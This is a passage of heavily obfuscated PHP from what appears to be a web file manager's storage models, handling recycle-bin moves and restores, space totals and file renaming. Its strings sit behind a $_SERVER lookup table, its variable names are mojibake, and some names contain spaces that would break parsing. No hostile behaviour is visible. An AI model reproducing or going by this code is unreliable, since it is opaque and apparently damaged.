$¸íŞ¾¬¡[$òòœäò¹][$Ó“…ËÉü[517]]) { $¸íŞ¾¬¡[$òòœäò¹][$Ó“…ËÉü[79]] += $¢»ü™áª[$Ó“…ËÉü[79]]; } } foreach ($¸íŞ¾¬¡ as $¢»ü™áª) { $ºâ½æĞİ = $this->parentLevelArray($¢»ü™áª[$Ó“…ËÉü[601]]); foreach ($ºâ½æĞİ as $òòœäò¹) { $òòœäò¹ = $òòœäò¹ . $Ó“…ËÉü[12]; if (!isset($¸íŞ¾¬¡[$òòœäò¹])) { continue; } if ($¢»ü™áª[$Ó“…ËÉü[517]] == $¸íŞ¾¬¡[$òòœäò¹][$Ó“…ËÉü[517]]) { $¸íŞ¾¬¡[$òòœäò¹][$Ó“…ËÉü[79]] += $¢»ü™áª[$Ó“…ËÉü[79]]; } } } $¸Å¹’Ïú = array(); foreach ($¸íŞ¾¬¡ as $¢»ü™áª) { if ($¢»ü™áª[$Ó“…ËÉü[79]] == $¢»ü™áª[$Ó“…ËÉü[2460]]) { continue; } $¸Å¹’Ïú[] = array($Ó“…ËÉü[193], $¢»ü™áª[$Ó“…ËÉü[193]], $Ó“…ËÉü[79], $¢»ü™áª[$Ó“…ËÉü[79]]); } $this->saveAll($¸Å¹’Ïú); } public function userSpaceReset($ÔÁàÎÈª = false) { $ïşğ¸­Ö =& $_SERVER[±Ö‰ô½¯]; $ú÷Œ‘¯ = $this->where(array($ïşğ¸­Ö[190] => self::TYPE_USER, $ïşğ¸­Ö[586] => $ÔÁàÎÈª, $ïşğ¸­Ö[497] => 0))->sum($ïşğ¸­Ö[79]); $ú÷Œ‘¯ = !$ú÷Œ‘¯ || $ú÷Œ‘¯ <= 0 ? 0 : $ú÷Œ‘¯; Model($ïşğ¸­Ö[594])->userEdit($ÔÁàÎÈª, array($ïşğ¸­Ö[2125] => $ú÷Œ‘¯)); } public function targetSpaceUpdate($ô¸Â›¸à, $¡´ù£µ) { $ò”Ÿî²Â =& $_SERVER[±Ö‰ô½¯]; if (!$¡´ù£µ) { return; } if (!in_array($ô¸Â›¸à, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $²¹ßŒ„» = $this->targetSpaceSize($ô¸Â›¸à, $¡´ù£µ); if ($ô¸Â›¸à == self::TYPE_USER) { Model($ò”Ÿî²Â[594])->userEdit($¡´ù£µ, array($ò”Ÿî²Â[2125] => $²¹ßŒ„»)); } else { if ($ô¸Â›¸à == self::TYPE_GROUP) { Model($ò”Ÿî²Â[602])->groupEdit($¡´ù£µ, array($ò”Ÿî²Â[2125] => $²¹ßŒ„»)); } } } public function targetSpaceSize($Æ¯ûº¿ó, $³´í“öæ) { $¡”È†Â =& $_SERVER[±Ö‰ô½¯]; $¦È­¢ìÖ = 0; $ÁæÄØî¶ = $this->targetSourceRoot($Æ¯ûº¿ó, $³´í“öæ, !0); foreach ($ÁæÄØî¶ as $õú‚âé) { if (!$õú‚âé) { continue; } $¦È­¢ìÖ += floatval($õú‚âé[$¡”È†Â[79]]); $½˜ÈÇˆœ = array($¡”È†Â[672] => array($¡”È†Â[632], $¡”È†Â[610] . $õú‚âé[$¡”È†Â[193]] . $¡”È†Â[633])); $àû£Ÿ†  = Model($¡”È†Â[515])->field($¡”È†Â[503])->where($½˜ÈÇˆœ)->select(); $àû£Ÿ†  = array_to_keyvalue($àû£Ÿ† , $¡”È†Â[12], $¡”È†Â[193]); $àû£Ÿ†  = array_unique(array_filter($àû£Ÿ† )); if ($àû£Ÿ† ) { $½˜ÈÇˆœ = array($¡”È†Â[503] => array($¡”È†Â[504], $àû£Ÿ† )); $¦È­¢ìÖ += floatval($this->where($½˜ÈÇˆœ)->sum($¡”È†Â[79])); } } $¦È­¢ìÖ = !$¦È­¢ìÖ || $¦È­¢ìÖ <= 0 ? 0 : $¦È­¢ìÖ; return $¦È­¢ìÖ; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($¥ÊĞÜĞ) { return $this->fileTypeProfile($¥ÊĞÜĞ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ÇîµÁ¶÷) { return $this->fileTypeProfile($ÇîµÁ¶÷, SourceModel::TYPE_GROUP); } private function fileTypeProfile($±Ş½Â´ó, $îÊÍ şš) { $®™‚ñÜ§ =& $_SERVER[±Ö‰ô½¯]; $¢—ÓÚ±Ã = $®™‚ñÜ§[2461] . $±Ş½Â´ó . $®™‚ñÜ§[11] . $îÊÍ şš; $§¦çÕ­³ = Cache::get($¢—ÓÚ±Ã); if ($§¦çÕ­³) { return $§¦çÕ­³; } $öƒøÜ¼ƒ = array($®™‚ñÜ§[666] => 0); if ($±Ş½Â´ó != !1) { $öƒøÜ¼ƒ[$®™‚ñÜ§[586]] = $±Ş½Â´ó; $öƒøÜ¼ƒ[$®™‚ñÜ§[190]] = $îÊÍ şš; } $ßòÌ„Åñ = array(); $ã×úÌ»ú = $this->field(array($®™‚ñÜ§[2387] => $®™‚ñÜ§[2092], $®™‚ñÜ§[2462] => $®™‚ñÜ§[79]))->where($öƒøÜ¼ƒ)->find(); $ßòÌ„Åñ[$®™‚ñÜ§[2463]] = array($®™‚ñÜ§[2464] => LNG($®™‚ñÜ§[2463]), $®™‚ñÜ§[2465] => intval($ã×úÌ»ú[$®™‚ñÜ§[2092]]), $®™‚ñÜ§[637] => intval($ã×úÌ»ú[$®™‚ñÜ§[79]])); $ûÇšÃÚû = KodIO::fileTypeList(); foreach ($ûÇšÃÚû as $Ñ¿ı¨ş€ => $ë”É¿òò) { $öƒøÜ¼ƒ[$®™‚ñÜ§[498]] = $this->fileTypeWhere($Ñ¿ı¨ş€); $ã×úÌ»ú = $this->field(array($®™‚ñÜ§[2387] => $®™‚ñÜ§[2092], $®™‚ñÜ§[2462] => $®™‚ñÜ§[79]))->where($öƒøÜ¼ƒ)->find(); $ßòÌ„Åñ[$Ñ¿ı¨ş€] = array($®™‚ñÜ§[2464] => $ë”É¿òò[$®™‚ñÜ§[32]], $®™‚ñÜ§[2465] => intval($ã×úÌ»ú[$®™‚ñÜ§[2092]]), $®™‚ñÜ§[637] => intval($ã×úÌ»ú[$®™‚ñÜ§[79]])); } Cache::set($¢—ÓÚ±Ã, $ßòÌ„Åñ, 1200); return $ßòÌ„Åñ; } public function fileNameExist($ÖûíÀŒ¸, $Í¬‘ØÉ÷) { $º¯¥ÈÇ× =& $_SERVER[±Ö‰ô½¯]; $¶Ùó´Á = $this->field($º¯¥ÈÇ×[2466])->where(array($º¯¥ÈÇ×[192] => $ÖûíÀŒ¸, $º¯¥ÈÇ×[32] => $Í¬‘ØÉ÷, $º¯¥ÈÇ×[517] => 0))->find(); return is_array($¶Ùó´Á) ? $¶Ùó´Á[$º¯¥ÈÇ×[193]] : !1; } public function childList($Ÿ‚öšÃõ) { $ßÒ€÷á =& $_SERVER[±Ö‰ô½¯]; $ëù§ùû = $ßÒ€÷á[2438] . $Ÿ‚öšÃõ; if (isset(self::$cacheChildList[$ëù§ùû])) { return self::$cacheChildList[$ëù§ùû]; } $—í ¼´Ì = array($ßÒ€÷á[192] => intval($Ÿ‚öšÃõ), $ßÒ€÷á[517] => 0); $Å…Øß¤ş = $this->where($—í ¼´Ì)->select(); $Å…Øß¤ş = $Å…Øß¤ş ? $Å…Øß¤ş : array(); self::$cacheChildList[$ëù§ùû] = $Å…Øß¤ş; foreach ($Å…Øß¤ş as $·¾ÜÆä’) { $ëù§ùû = $ßÒ€÷á[544] . $·¾ÜÆä’[$ßÒ€÷á[193]]; self::$cacheSourceInfo[$ëù§ùû] = $·¾ÜÆä’; } return $Å…Øß¤ş; } public function fileNameAuto($Ûİû¶ÑÍ, $‹ üáÎ­, $àØ„™şÕ = REPEAT_RENAME, $ˆ›Î‡ÑĞ = false) { $ªÀÇœ¡ò =& $_SERVER[±Ö‰ô½¯]; $şš·–®Ã = get_path_ext($‹ üáÎ­); $•¥ñ¢Š = $şš·–®Ã ? get_path_ext_name($‹ üáÎ­) . $ªÀÇœ¡ò[2467] . $şš·–®Ã : $‹ üáÎ­ . $ªÀÇœ¡ò[472]; $‰Ôİ×Æò = array($ªÀÇœ¡ò[192] => $Ûİû¶ÑÍ, $ªÀÇœ¡ò[517] => 0, $ªÀÇœ¡ò[32] => array($ªÀÇœ¡ò[471], $•¥ñ¢Š)); $ò§ÙÀÒ = $this->field($ªÀÇœ¡ò[32])->where($‰Ôİ×Æò)->select(); $©·¤‡™ = array_to_keyvalue($ò§ÙÀÒ, $ªÀÇœ¡ò[12], $ªÀÇœ¡ò[32]); return $this->fileNameAutoGet($©·¤‡™, $‹ üáÎ­, $àØ„™şÕ, $ˆ›Î‡ÑĞ); } public function fileNameAutoGet($•–¢ã°ä, $Ö‰ıè, $ıäà§ï, $¨Õó‘î) { $óüÉÛ±™ =& $_SERVER[±Ö‰ô½¯]; if ($ıäà§ï == REPEAT_REPLACE || !$•–¢ã°ä || !in_array_not_case($Ö‰ıè, $•–¢ã°ä) || $¨Õó‘î && $ıäà§ï != REPEAT_RENAME_FOLDER) { return $Ö‰ıè; } if ($ıäà§ï == REPEAT_SKIP) { return !1; } $Ğğ½ß = $óüÉÛ±™[10] . get_path_ext($Ö‰ıè); $Ğğ½ß = $Ğğ½ß == $óüÉÛ±™[10] || $¨Õó‘î ? $óüÉÛ±™[12] : $Ğğ½ß; for ($ÄØß·‚— = 1; $ÄØß·‚— <= count($•–¢ã°ä) + 1; $ÄØß·‚—++) { $òÀò„Şî = substr($Ö‰ıè, 0, strlen($Ö‰ıè) - strlen($Ğğ½ß)); $Åø³èäğ = $òÀò„Şî . "\x28{$ÄØß·‚—}\51{$Ğğ½ß}"; if (!in_array_not_case($Åø³èäğ, $•–¢ã°ä)) { return $Åø³èäğ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\x75\x72\143\x65\x5f\x72\x65\143\x79\x63\x6c\145"; protected $dataAuto = array(array("\143\162\145\x61\164\x65\x54\151\155\x65", "\164\151\x6d\145", "\151\x6e\x73\x65\162\x74", "\x66\x75\x6e\x63\x74\151\157\156")); public function listData($Ó´ŞÄ¾È = false) { $­•„Û«¼ =& $_SERVER[±Ö‰ô½¯]; $Ó´ŞÄ¾È = $Ó´ŞÄ¾È ? $Ó´ŞÄ¾È : USER_ID; $Ï¡¼ú¡ = $this->where(array($­•„Û«¼[1921] => $Ó´ŞÄ¾È))->select(); return array_to_keyvalue($Ï¡¼ú¡, $­•„Û«¼[12], $­•„Û«¼[193]); } public function moveToRecycle($Â€ÔãÚ) { $ã¡‚ÂŒ¿ =& $_SERVER[±Ö‰ô½¯]; $òÙ‚ÏÎ„ = Model($ã¡‚ÂŒ¿[1482]); $øÍÎ«¨ = $òÙ‚ÏÎ„->sourceInfo($Â€ÔãÚ); if (!$øÍÎ«¨ || $øÍÎ«¨[$ã¡‚ÂŒ¿[517]] == $ã¡‚ÂŒ¿[91]) { return; } $áü¼æ‹ = array($ã¡‚ÂŒ¿[503] => $Â€ÔãÚ, $ã¡‚ÂŒ¿[1921] => USER_ID, $ã¡‚ÂŒ¿[668] => $øÍÎ«¨[$ã¡‚ÂŒ¿[190]], $ã¡‚ÂŒ¿[669] => $øÍÎ«¨[$ã¡‚ÂŒ¿[586]], $ã¡‚ÂŒ¿[672] => $øÍÎ«¨[$ã¡‚ÂŒ¿[601]]); $this->add($áü¼æ‹); $this->recycleMove($Â€ÔãÚ, 1); if ($øÍÎ«¨[$ã¡‚ÂŒ¿[497]] == $ã¡‚ÂŒ¿[91]) { $ò™Ö½ô§ = array($ã¡‚ÂŒ¿[672] => array($ã¡‚ÂŒ¿[632], $øÍÎ«¨[$ã¡‚ÂŒ¿[601]] . $Â€ÔãÚ . $ã¡‚ÂŒ¿[633])); $òÙ‚ÏÎ„->where($ò™Ö½ô§)->setField($ã¡‚ÂŒ¿[517], 1); } } public function clear() { $this->remove(!1); } public function remove($ªàÒšÉì = false, $ºğ€†×º = false) { $Ó€¯šÆÖ =& $_SERVER[±Ö‰ô½¯]; $ºğ€†×º = $ºğ€†×º ? $ºğ€†×º : USER_ID; $Å»Í“Ÿ… = Model($Ó€¯šÆÖ[1482]); $ÂÀíûğ = $this->listData($ºğ€†×º); $ªàÒšÉì = $ªàÒšÉì === !1 ? !1 : $ªàÒšÉì; $ˆÄ…ô = array(); foreach ($ÂÀíûğ as $êéÛ÷) { if ($ªàÒšÉì != !1 && !in_array($êéÛ÷, $ªàÒšÉì)) { continue; } $ª¯½£Ï = $Å»Í“Ÿ…->sourceInfo($êéÛ÷); $Å»Í“Ÿ…->remove($êéÛ÷, !1); $³Ë¿êÎÜ = $ª¯½£Ï[$Ó€¯šÆÖ[190]] . $Ó€¯šÆÖ[11] . $ª¯½£Ï[$Ó€¯šÆÖ[586]]; $ˆÄ…ô[$³Ë¿êÎÜ] = array($Ó€¯šÆÖ[668] => $ª¯½£Ï[$Ó€¯šÆÖ[190]], $Ó€¯šÆÖ[586] => $ª¯½£Ï[$Ó€¯šÆÖ[586]]); $this->where(array($Ó€¯šÆÖ[193] => $êéÛ÷))->delete(); } foreach ($ˆÄ…ô as $îòğƒ×) { $Å»Í“Ÿ…->targetSpaceUpdate($îòğƒ×[$Ó€¯šÆÖ[190]], $îòğƒ×[$Ó€¯šÆÖ[586]]); } } public function restore($â×©ª¯ = false) { $ÙĞ«¯æ = $this->listData(); $this->_restoreSource($ÙĞ«¯æ, $â×©ª¯); } public function removeUserAll($¬ÕğÕ¢¶) { $this->remove(!1, $¬ÕğÕ¢¶); } public function restoreItem($ª÷œ–ª¢) { $this->_restoreSource(array($ª÷œ–ª¢), array($ª÷œ–ª¢)); } private function _restoreSource($Ë’şç·¯, $°„ïŒ†) { $è‡òì¿İ =& $_SERVER[±Ö‰ô½¯]; $Ö¨Ï®ÌÌ = Model($è‡òì¿İ[1482]); $°„ïŒ† = $°„ïŒ† == !1 ? !1 : $°„ïŒ†; if (!$Ë’şç·¯) { return !0; } $ˆÙš£¬ı = array(); foreach ($Ë’şç·¯ as $İé×€¾„) { if ($°„ïŒ† != !1 && !in_array($İé×€¾„, $°„ïŒ†)) { continue; } $‚ˆ‹ÔÆó = $Ö¨Ï®ÌÌ->sourceInfo($İé×€¾„); $àïå”ƒÛ = $Ö¨Ï®ÌÌ->sourceInfo($‚ˆ‹ÔÆó[$è‡òì¿İ[192]]); if ($àïå”ƒÛ[$è‡òì¿İ[517]] == $è‡òì¿İ[91]) { continue; } $Ö¨Ï®ÌÌ->lockMoveStart($İé×€¾„); $this->recycleMove($İé×€¾„, 0); if ($‚ˆ‹ÔÆó[$è‡òì¿İ[497]] == $è‡òì¿İ[91]) { $µ„ÖÛë = array($è‡òì¿İ[672] => array($è‡òì¿İ[632], $‚ˆ‹ÔÆó[$è‡òì¿İ[601]] . $İé×€¾„ . $è‡òì¿İ[633])); $Ö¨Ï®ÌÌ->where($µ„ÖÛë)->setField($è‡òì¿İ[517], 0); $this->restoreFolderChildren($İé×€¾„, $Ë’şç·¯); } $this->where(array($è‡òì¿İ[193] => $İé×€¾„))->delete(); $Ö¨Ï®ÌÌ->folderSizeReset($‚ˆ‹ÔÆó[$è‡òì¿İ[192]]); $ˆÙš£¬ı[] = $‚ˆ‹ÔÆó[$è‡òì¿İ[192]]; if ($‚ˆ‹ÔÆó[$è‡òì¿İ[497]] == $è‡òì¿İ[91]) { $ˆÙš£¬ı[] = $İé×€¾„; } $Ö¨Ï®ÌÌ->lockMoveEnd($İé×€¾„); } $Ö¨Ï®ÌÌ->updateModifyTime($ˆÙš£¬ı); } private function restoreFolderChildren($èº÷¬§ò, $´Ÿ½öİš) { $ôáëËÕ¿ =& $_SERVER[±Ö‰ô½¯]; $ØÇ‹¬æƒ = Model($ôáëËÕ¿[1482]); $½Ì®Å¬ = array($ôáëËÕ¿[193] => array($ôáëËÕ¿[7], array())); foreach ($´Ÿ½öİš as $÷µÕ‰¹¸) { if ($÷µÕ‰¹¸ == $èº÷¬§ò) { continue; } if (!$ØÇ‹¬æƒ->isParentOf($èº÷¬§ò, $÷µÕ‰¹¸)) { continue; } $ÏÏ¸°­ª = $ØÇ‹¬æƒ->sourceInfo($÷µÕ‰¹¸); if ($ÏÏ¸°­ª[$ôáëËÕ¿[497]] == $ôáëËÕ¿[91]) { $½Ì®Å¬[] = array($ôáëËÕ¿[672] => array($ôáëËÕ¿[632], $ÏÏ¸°­ª[$ôáëËÕ¿[601]] . $÷µÕ‰¹¸ . $ôáëËÕ¿[633])); } else { $½Ì®Å¬[$ôáëËÕ¿[193]][1][] = $÷µÕ‰¹¸; } } if (!$½Ì®Å¬[$ôáëËÕ¿[193]][1]) { unset($½Ì®Å¬[$ôáëËÕ¿[193]]); } if (!$½Ì®Å¬) { return; } if (is_array($½Ì®Å¬[$ôáëËÕ¿[193]]) && is_array($½Ì®Å¬[$ôáëËÕ¿[193]][1])) { $½Ì®Å¬[$ôáëËÕ¿[193]][1] = array_unique($½Ì®Å¬[$ôáëËÕ¿[193]][1]); } $½Ì®Å¬[$ôáëËÕ¿[1116]] = $ôáëËÕ¿[2236]; $ØÇ‹¬æƒ->where($½Ì®Å¬)->setField($ôáëËÕ¿[517], 1); } private function recycleMove($ ¯ı­å, $şŞÈ²• = 1) { $ä¡¿¦õİ =& $_SERVER[±Ö‰ô½¯]; $÷ôˆ– = Model($ä¡¿¦õİ[1482]); $êğµ¯Û· = Model($ä¡¿¦õİ[2468]); $¨ÆéÈå = array($ä¡¿¦õİ[193] => $ ¯ı­å); if ($şŞÈ²•) { $÷ôˆ–->where($¨ÆéÈå)->setField($ä¡¿¦õİ[517], 1); $êğµ¯Û·->eventRecycle($ ¯ı­å, $ä¡¿¦õİ[2469]); } else { $–¬©¡²É = $÷ôˆ–->where($¨ÆéÈå)->find(); $†Ò”ã÷¦ = $–¬©¡²É[$ä¡¿¦õİ[497]] == $ä¡¿¦õİ[91]; $ïÑšĞãÌ = $÷ôˆ–->fileNameAuto($–¬©¡²É[$ä¡¿¦õİ[192]], $–¬©¡²É[$ä¡¿¦õİ[32]], REPEAT_RENAME_FOLDER, $†Ò”ã÷¦); if ($ïÑšĞãÌ != $–¬©¡²É[$ä¡¿¦õİ[32]]) { $÷ôˆ–->rename($ ¯ı­å, $ïÑšĞãÌ); } $÷ôˆ–->where($¨ÆéÈå)->setField($ä¡¿¦õİ[517], 0); $êğµ¯Û·->eventRecycle($ ¯ı­å, $ä¡¿¦õİ[2470]); } } } goto aÀ‹Ÿ©Œ‚; AÃ‘íÕÛ•®: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ì¡¦Ãç =& $_SERVER[±Ö‰ô½¯]; $this->objectDriver = array($ì¡¦Ãç[60], $ì¡¦Ãç[61], $ì¡¦Ãç[62], $ì¡¦Ãç[63], $ì¡¦Ãç[64], $ì¡¦Ãç[65], $ì¡¦Ãç[66], $ì¡¦Ãç[67], $ì¡¦Ãç[68], $ì¡¦Ãç[69], $ì¡¦Ãç[70], $ì¡¦Ãç[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($¦Åë®¼Ã) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($¦Åë®¼Ã, $_SERVER[±Ö‰ô½¯][8]); } return $¦Åë®¼Ã; } public function iconvApp($¼ÒÙ¸Ú) { return $¼ÒÙ¸Ú; } public function iconvSystem($ÍÔ¥¼à¼) { return $ÍÔ¥¼à¼; } public function iconvTo($Õñ Ó¥, $æ¹Ëé£ƒ, $¼¿ĞÅØ‚) { $œÜ‹¥üŠ =& $_SERVER[±Ö‰ô½¯]; if (!$Õñ Ó¥ || !function_exists($œÜ‹¥üŠ[72])) { return $Õñ Ó¥; } static $»É“€ˆê = array(); $š¯é­óü = $æ¹Ëé£ƒ . $œÜ‹¥üŠ[73] . $¼¿ĞÅØ‚ . $œÜ‹¥üŠ[74] . $Õñ Ó¥; if (isset($»É“€ˆê[$š¯é­óü])) { return $»É“€ˆê[$š¯é­óü]; } if (function_exists($œÜ‹¥üŠ[75])) { $†Ùéä¬ = @mb_convert_encoding($Õñ Ó¥, $¼¿ĞÅØ‚, $æ¹Ëé£ƒ); } else { $†Ùéä¬ = @iconv($æ¹Ëé£ƒ, $¼¿ĞÅØ‚, $Õñ Ó¥); } $†Ùéä¬ = $†Ùéä¬ ? $†Ùéä¬ : $Õñ Ó¥; if (strstr($†Ùéä¬, $œÜ‹¥üŠ[76])) { $†Ùéä¬ = str_replace($œÜ‹¥üŠ[76], $œÜ‹¥üŠ[11], $†Ùéä¬); } $»É“€ˆê[$æ¹Ëé£ƒ . $œÜ‹¥üŠ[73] . $¼¿ĞÅØ‚ . $œÜ‹¥üŠ[74] . $Õñ Ó¥] = $†Ùéä¬; $»É“€ˆê[$¼¿ĞÅØ‚ . $œÜ‹¥üŠ[73] . $æ¹Ëé£ƒ . $œÜ‹¥üŠ[74] . $Õñ Ó¥] = $Õñ Ó¥; $»É“€ˆê[$¼¿ĞÅØ‚ . $œÜ‹¥üŠ[73] . $æ¹Ëé£ƒ . $œÜ‹¥üŠ[74] . $†Ùéä¬] = $Õñ Ó¥; $»É“€ˆê[$æ¹Ëé£ƒ . $œÜ‹¥üŠ[73] . $¼¿ĞÅØ‚ . $œÜ‹¥üŠ[74] . $†Ùéä¬] = $†Ùéä¬; return $†Ùéä¬; } public function getPathInner($¯ªË‚–ù) { $·î¤Àşİ = IO::init($¯ªË‚–ù); return $·î¤Àşİ->path; } public function getPathOuter($§ëĞŸŞÔ) { $‚ì½»á— =& $_SERVER[±Ö‰ô½¯]; $ò‹Â¡çã = strlen(trim($this->pathBase, $‚ì½»á—[8])); $§ëĞŸŞÔ = substr(trim($§ëĞŸŞÔ, $‚ì½»á—[8]), $ò‹Â¡çã); return $this->pathDriver . $‚ì½»á—[8] . ltrim($§ëĞŸŞÔ, $‚ì½»á—[8]); } public function isParentOf($»Ãäº÷, $†¦ŒË¿) { $Ğ¬Œ×¾¤ =& $_SERVER[±Ö‰ô½¯]; $»Ãäº÷ = rtrim(strtolower($»Ãäº÷), $Ğ¬Œ×¾¤[8]) . $Ğ¬Œ×¾¤[8]; $†¦ŒË¿ = rtrim(strtolower($†¦ŒË¿), $Ğ¬Œ×¾¤[8]) . $Ğ¬Œ×¾¤[8]; $¨»ëÂë– = strpos($†¦ŒË¿, $»Ãäº÷) === 0; return $¨»ëÂë–; } public function getType() { $Ï§È¯·¢ =& $_SERVER[±Ö‰ô½¯]; $İµİÓ˜ = str_replace($Ï§È¯·¢[77], $Ï§È¯·¢[12], get_class($this)); return strtolower($İµİÓ˜); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($¦«‡ŠÒ, $œ¿è¸‚š) { $ìîï’¤× =& $_SERVER[±Ö‰ô½¯]; $‹©Ã± = rtrim($¦«‡ŠÒ, $ìîï’¤×[8]) . $ìîï’¤×[8] . $œ¿è¸‚š; $ÍÈÍñŒÙ = $this->exist($‹©Ã±); return $ÍÈÍñŒÙ ? $‹©Ã± : !1; } public function setModifyTime($ú…Î±†, $ãöğ›å© = '') { } public function renameObject($·Ì»ıŸ’, $ÂÉâÇˆ±) { $êª€ŒÛÍ = $ÂÉâÇˆ±; $·Ì»ıŸ’ = $this->getPathOuter($·Ì»ıŸ’); $ÂÉâÇˆ± = $this->pathFather($·Ì»ıŸ’) . $ÂÉâÇˆ±; $³Ë¥ÏúÚ = IO::copy($·Ì»ıŸ’, $this->pathFather($·Ì»ıŸ’), REPEAT_RENAME_FOLDER, $êª€ŒÛÍ); if ($³Ë¥ÏúÚ) { IO::remove($·Ì»ıŸ’); } return $³Ë¥ÏúÚ ? $ÂÉâÇˆ± : !1; } public function tempFile($ï€õ¨ôĞ = '', $èÚ ÉÖ = '') { if (!$ï€õ¨ôĞ) { $ï€õ¨ôĞ = rand_string(15); } $ƒÛ§’şˆ = TEMP_FILES . rand_string(15) . $_SERVER[±Ö‰ô½¯][8]; @mkdir($ƒÛ§’şˆ, DEFAULT_PERRMISSIONS, !0); $»½ïÀ“´ = $ƒÛ§’şˆ . $ï€õ¨ôĞ; @touch($»½ïÀ“´); if ($èÚ ÉÖ) { file_put_contents($»½ïÀ“´, $èÚ ÉÖ); } return $»½ïÀ“´; } public function tempFileRemve($’±Ÿ¹ãÅ) { @unlink($’±Ÿ¹ãÅ); @rmdir($this->pathFather($’±Ÿ¹ãÅ)); } public function mkfile($ÌÚ–´Î„, $¨Çå±ìÏ = '', $ “ê·–‚ = REPEAT_RENAME) { } public function mkdir($ˆÉÂŠ—è, $ôïÊÙ¡ˆ = REPEAT_SKIP) { } public function delFile($Éˆú¦Ëé) { } public function delFolder($·ó­›ÖÍ) { } public function copyFile($Ì‰ıï˜Ü, $¬ó·ï) { } public function moveFile($å†Êà³¨, $ßÇäÎõæ) { } public function remove($²Ñè÷ôâ) { if ($this->isFile($²Ñè÷ôâ)) { return $this->delFile($²Ñè÷ôâ); } return $this->delFolder($²Ñè÷ôâ); } public function rename($œÆáßŸ, $äùíˆŒÛ) { } public function exist($›óÓöœ) { } public function isFile($’Çòª€‘) { } public function isFolder($öèÄ©ğ) { } public function size($É•–Åìş) { } public function info($­‚¡¡Â×) { } public function infoSimple($¸±’ Â) { return $this->info($¸±’ Â); } public function infoAuth($ÊåÃ¬ó£) { return $this->info($ÊåÃ¬ó£); } public function infoFull($Ìşşİ½â) { return $this->info($Ìşşİ½â); } public function infoFullSimple($•à¸ë“ì) { return $this->info($•à¸ë“ì); } public function infoWithChildren($“³¥¡äÁ) { $ÙŒĞ¢Ñ’ =& $_SERVER[±Ö‰ô½¯]; static $‰ƒ”¬ß½ = array(); if (isset($‰ƒ”¬ß½[$“³¥¡äÁ])) { return $‰ƒ”¬ß½[$“³¥¡äÁ]; } $Ôå„âğç = $this->info($“³¥¡äÁ); if ($Ôå„âğç && $Ôå„âğç[$ÙŒĞ¢Ñ’[33]] == $ÙŒĞ¢Ñ’[78]) { $İ†şĞŠ¢ = array($ÙŒĞ¢Ñ’[79] => 0, $ÙŒĞ¢Ñ’[80] => 0, $ÙŒĞ¢Ñ’[81] => 0); $this->infoChildren($“³¥¡äÁ, $İ†şĞŠ¢); $Ôå„âğç[$ÙŒĞ¢Ñ’[79]] = $İ†şĞŠ¢[$ÙŒĞ¢Ñ’[79]]; $Ôå„âğç[$ÙŒĞ¢Ñ’[82]] = array($ÙŒĞ¢Ñ’[83] => $İ†şĞŠ¢[$ÙŒĞ¢Ñ’[80]], $ÙŒĞ¢Ñ’[84] => $İ†şĞŠ¢[$ÙŒĞ¢Ñ’[81]]); $‰ƒ”¬ß½[$“³¥¡äÁ] = $Ôå„âğç; } return $Ôå„âğç; } public function listPath($¤“ãäØÛ, $¹¦’Æï  = false) { } public function has($ıÑ¦¦½¤, $Ò½œ‚öà = false, $ú¬«É©ß = false) { } public function canRead($éõ•¡ãÁ) { } public function canWrite($®„£ËˆÄ) { } public function getContent($æœ÷üŞ¨) { } public function setContent($³ Öäƒ, $ºÏÁÔ‘” = '') { } protected function infoChildren($„š‹ùèş, &$ôƒêø‘) { $ÏÖİòı  =& $_SERVER[±Ö‰ô½¯]; check_abort_echo(); $±¡ˆ÷½‹ = $this->listPath($„š‹ùèş, !0); $±¡ˆ÷½‹ = array_merge($±¡ˆ÷½‹[$ÏÖİòı [85]], $±¡ˆ÷½‹[$ÏÖİòı [86]]); foreach ($±¡ˆ÷½‹ as $æ¬¬şæ) { if ($æ¬¬şæ[$ÏÖİòı [33]] == $ÏÖİòı [78]) { $ôƒêø‘[$ÏÖİòı [81]]++; $®Ú²šÑ = $this->getPathInner($æ¬¬şæ[$ÏÖİòı [87]]); $this->infoChildren($®Ú²šÑ, $ôƒêø‘); } else { $ôƒêø‘[$ÏÖİòı [80]]++; $ôƒêø‘[$ÏÖİòı [79]] += $æ¬¬şæ[$ÏÖİòı [79]]; } } } public function fileSubstr($ªÀ´—©», $Àîş³íŸ, $ÉòÍÖÍ´) { } public function listAll($ä³¸×óƒ) { } public function listAllMake($à•Ùû­Â, &$Æğ»ö»ä) { $éØÆ°âŞ =& $_SERVER[±Ö‰ô½¯]; check_abort_echo(); $«ïğ¨ú = $this->listPath($à•Ùû­Â, !0); if (!$«ïğ¨ú) { return; } $ûæû–º = array_merge($«ïğ¨ú[$éØÆ°âŞ[85]], $«ïğ¨ú[$éØÆ°âŞ[86]]); foreach ($ûæû–º as $–´ÂÆÃ) { $ü¹òó•ƒ = $–´ÂÆÃ[$éØÆ°âŞ[33]] == $éØÆ°âŞ[78]; $©Åùã = array($éØÆ°âŞ[87] => $–´ÂÆÃ[$éØÆ°âŞ[87]], $éØÆ°âŞ[78] => $ü¹òó•ƒ); if (isset($–´ÂÆÃ[$éØÆ°âŞ[79]])) { $©Åùã[$éØÆ°âŞ[79]] = $–´ÂÆÃ[$éØÆ°âŞ[79]]; } if (isset($–´ÂÆÃ[$éØÆ°âŞ[88]])) { $©Åùã[$éØÆ°âŞ[88]] = $–´ÂÆÃ[$éØÆ°âŞ[88]]; } if (!$ü¹òó•ƒ) { $Æğ»ö»ä[] = $©Åùã; continue; } $Æğ»ö»ä[] = $©Åùã; $ò‰Ü…±Ò = $–´ÂÆÃ[$éØÆ°âŞ[87]]; $ÊÍÚ¶úÔ = $this->pathDriver; if (substr($–´ÂÆÃ[$éØÆ°âŞ[87]], 0, strlen($ÊÍÚ¶úÔ)) == $ÊÍÚ¶úÔ) { $ò‰Ü…±Ò = substr($ò‰Ü…±Ò, strlen($ÊÍÚ¶úÔ)); } $this->listAllMake($ò‰Ü…±Ò, $Æğ»ö»ä); } } public function listAllSimple($çûÃÎ“õ, $Öùæ¯İØ = false) { 